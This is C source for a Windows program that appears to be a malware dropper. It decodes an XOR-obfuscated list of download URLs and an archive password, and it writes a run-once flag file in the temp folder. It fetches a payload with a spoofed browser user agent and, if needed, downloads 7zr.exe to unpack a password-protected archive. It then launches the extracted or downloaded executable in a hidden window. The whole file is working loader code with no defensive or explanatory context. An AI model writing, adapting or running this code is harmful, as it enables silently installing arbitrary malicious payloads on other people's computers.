static void xd(unsigned char *d, int n, const unsigned char *k, int kn) {
    int i; for (i = 0; i < n; i++) d[i] ^= k[i % kn];
}
static int ri(const unsigned char *d, int *o) {
    int v = (d[*o]<<24)|(d[*o+1]<<16)|(d[*o+2]<<8)|d[*o+3];
    *o += 4; return v;
}
static char *rs(const unsigned char *d, int *o) {
    int l = ri(d, o);
    char *s = (char*)calloc(1, (size_t)l + 1);
    if (s) memcpy(s, d + *o, l);
    *o += l; return s;
}

static int dlf(const char *url, const char *dest) {
    HINTERNET hi, hu; HANDLE hf; char b[8192]; DWORD rd, wr; int t = 0;
    hi = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hi) return 0;
    hu = InternetOpenUrlA(hi, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hu) { InternetCloseHandle(hi); return 0; }
    hf = CreateFileA(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hu); InternetCloseHandle(hi); return 0;
    }
    while (InternetReadFile(hu, b, sizeof(b), &rd) && rd > 0) {
        WriteFile(hf, b, rd, &wr, NULL); t += (int)rd;
    }
    CloseHandle(hf); InternetCloseHandle(hu); InternetCloseHandle(hi);
    return t;
}

static int csig(const char *p, const unsigned char *s, int sl) {
    unsigned char buf[8]; DWORD rd; HANDLE h;
    h = CreateFileA(p, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    ReadFile(h, buf, (DWORD)sl, &rd, NULL); CloseHandle(h);
    return (int)rd >= sl && memcmp(buf, s, sl) == 0;
}
static int i7z(const char *p) {
    unsigned char s[] = {0x37,0x7A,0xBC,0xAF,0x27,0x1C}; return csig(p,s,6);
}
static int ipe(const char *p) {
    unsigned char s[] = {0x4D,0x5A}; return csig(p,s,2);
}

static char *f7z(void) {
    static char pa[MAX_PATH]; char pf[MAX_PATH]; char tmp[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, pf) == S_OK) {
        snprintf(pa, MAX_PATH, "%s\\7-Zip\\7z.exe", pf);
        if (GetFileAttributesA(pa) != INVALID_FILE_ATTRIBUTES) return pa;
    }
    if (SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, pf) == S_OK) {
        snprintf(pa, MAX_PATH, "%s\\7-Zip\\7z.exe", pf);
        if (GetFileAttributesA(pa) != INVALID_FILE_ATTRIBUTES) return pa;
    }
    GetTempPathA(MAX_PATH, tmp);
    snprintf(pa, MAX_PATH, "%s7zr.exe", tmp);
    if (GetFileAttributesA(pa) != INVALID_FILE_ATTRIBUTES && ipe(pa)) return pa;
    if (dlf("https://www.7-zip.org/a/7zr.exe", pa) > 0 && ipe(pa)) return pa;
    snprintf(pa, MAX_PATH, "%s7zr.exe", tmp);
    if (dlf("https://github.com/ip7z/7zip/releases/download/24.08/7zr.exe", pa) > 0 && ipe(pa)) return pa;
    return NULL;
}

static void rh(const char *exe) {
    STARTUPINFOA si; PROCESS_INFORMATION pi; char cmd[MAX_PATH * 2];
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    snprintf(cmd, sizeof(cmd), "\"%s\"", exe);
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW | 0x01000000 | 0x00000200, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

static int rw(const char *cmdl, DWORD tmo) {
    STARTUPINFOA si; PROCESS_INFORMATION pi; DWORD ex = 1;
    char *c; size_t l;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    l = strlen(cmdl) + 1; c = (char*)malloc(l);
    if (!c) return 1;
    memcpy(c, cmdl, l);
    if (CreateProcessA(NULL, c, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, tmo);
        GetExitCodeProcess(pi.hProcess, &ex);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
    free(c); return (int)ex;
}

int main(void) {
    unsigned char buf[ECL]; int o = 0, i, nc, ok = 0;
    char tmp[MAX_PATH], arc[MAX_PATH], gid[64], fl[MAX_PATH];
    char **urls; char *pwd;
    HANDLE lk; DWORD wrl;

    GetTempPathA(MAX_PATH, tmp);
    snprintf(fl, MAX_PATH, "%srbc_" BC_FLAG_ID ".flag", tmp);
    lk = CreateFileA(fl, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (lk == INVALID_HANDLE_VALUE) return 0;
    WriteFile(lk, "ok", 2, &wrl, NULL);
    CloseHandle(lk);

    memcpy(buf, ec, ECL);
    xd(buf, ECL, ek, EKL);

    nc = ri(buf, &o);
    if (nc <= 0 || nc > 32) return 1;
    urls = (char**)calloc((size_t)nc, sizeof(char*));
    if (!urls) return 1;
    for (i = 0; i < nc; i++) urls[i] = rs(buf, &o);
    pwd = rs(buf, &o);

    GetTempPathA(MAX_PATH, tmp);
    snprintf(gid, sizeof(gid), "btc_%08lx%08lx",
        (unsigned long)GetTickCount(), (unsigned long)GetCurrentProcessId());
    snprintf(arc, MAX_PATH, "%s%s.tmp", tmp, gid);

    for (i = 0; i < nc; i++) {
        if (!urls[i] || !urls[i][0]) continue;
        if (dlf(urls[i], arc) > 0) {
            HANDLE hf = CreateFileA(arc, GENERIC_READ, FILE_SHARE_READ,
                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                unsigned char fb; DWORD rd;
                ReadFile(hf, &fb, 1, &rd, NULL); CloseHandle(hf);
                if (rd == 1 && fb != '<' && fb != '{') { ok = 1; break; }
            }
            DeleteFileA(arc);
        }
    }
    if (!ok) goto done;

    if (i7z(arc)) {
        char *z7, ed[MAX_PATH], cm[2048], sr[MAX_PATH];
        WIN32_FIND_DATAA fd; HANDLE hf;
        z7 = f7z();
        if (!z7) { DeleteFileA(arc); goto done; }
        snprintf(ed, MAX_PATH, "%s%s_d", tmp, gid);
        CreateDirectoryA(ed, NULL);
        snprintf(cm, sizeof(cm), "\"%s\" x \"%s\" -p\"%s\" -o\"%s\" -y",
            z7, arc, pwd, ed);
        rw(cm, 120000);
        DeleteFileA(arc);
        snprintf(sr, MAX_PATH, "%s\\*.exe", ed);
        hf = FindFirstFileA(sr, &fd);
        if (hf != INVALID_HANDLE_VALUE) {
            char ep[MAX_PATH];
            snprintf(ep, MAX_PATH, "%s\\%s", ed, fd.cFileName);
            FindClose(hf); rh(ep);
        }
    } else if (ipe(arc)) {
        char ep[MAX_PATH];
        snprintf(ep, MAX_PATH, "%s%s.exe", tmp, gid);
        MoveFileA(arc, ep); rh(ep);
    } else {
        DeleteFileA(arc);
    }

    for (i = 0; i < nc; i++) free(urls[i]);
    free(urls); free(pwd);
    return 0;
done:
    for (i = 0; i < nc; i++) if (urls[i]) free(urls[i]);
    free(urls); if (pwd) free(pwd);
    return 1;
}

